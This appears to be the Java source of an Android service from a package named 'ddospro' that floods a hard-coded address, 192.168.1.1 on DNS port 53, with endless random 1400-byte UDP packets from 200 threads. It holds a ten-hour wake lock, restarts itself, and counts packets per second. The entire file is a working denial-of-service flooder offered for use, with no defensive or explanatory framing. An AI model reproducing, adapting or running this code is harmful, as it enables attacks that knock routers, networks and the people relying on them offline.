package com.mzkyzak.ddospro;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import androidx.core.app.NotificationCompat;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicLong;

public class LocalSaturationService extends Service {
    public static final AtomicLong packetCount = new AtomicLong(0);
    public static final AtomicLong packetPerSecond = new AtomicLong(0);
    private volatile boolean isRunning = true;
    private Handler handler = new Handler(Looper.getMainLooper());
    private ExecutorService threadPool;
    private PowerManager.WakeLock wakeLock;

    private final String TARGET_IP = "192.168.1.1";
    private final int TARGET_PORT = 53;

    @Override
    public void onCreate() {
        super.onCreate();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Sentinel:Saturate");
        wakeLock.acquire(10 * 60 * 60 * 1000L); // 10 Hours mission duration
        threadPool = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors() * 8);
        showNotification();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        packetCount.set(0);
        packetPerSecond.set(0);

        Random random = new Random();
        for (int i = 0; i < 200; i++) {
            threadPool.execute(() -> {
                try (DatagramSocket socket = new DatagramSocket()) {
                    InetAddress ip = InetAddress.getByName(TARGET_IP);
                    byte[] data = new byte[1400];
                    while (isRunning) {
                        random.nextBytes(data);
                        DatagramPacket packet = new DatagramPacket(data, data.length, ip, TARGET_PORT);
                        socket.send(packet);
                        packetCount.incrementAndGet();
                    }
                } catch (Exception ignored) {}
            });
        }

        handler.postDelayed(new Runnable() {
            private long lastCount = 0;
            @Override
            public void run() {
                if (!isRunning) return;
                long current = packetCount.get();
                packetPerSecond.set(current - lastCount);
                lastCount = current;
                handler.postDelayed(this, 1000);
            }
        }, 1000);

        return START_STICKY;
    }

    private void showNotification() {
        String channelId = "saturate_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId,
                    "Network Saturate",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("📡 Network Saturate")
                .setContentText("HP full jaringan — browser lag")
                .setSmallIcon(android.R.drawable.ic_menu_compass)
                .build();

        startForeground(2, notification);
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        if (threadPool != null) threadPool.shutdownNow();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}